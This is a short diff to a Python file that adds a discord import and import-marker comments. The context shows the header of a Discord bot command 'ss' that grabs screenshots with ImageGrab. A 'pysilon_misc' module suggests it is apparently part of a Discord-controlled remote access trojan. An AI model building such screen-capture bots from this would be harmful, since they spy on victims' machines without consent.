@@ -1,6 +1,9 @@
+#<imports>
+import discord
 import subprocess
 from PIL import ImageGrab
 import resources.modules.misc as pysilon_misc
+#</imports>
 
 @client.command(name="ss")
 async def screenshot(ctx):
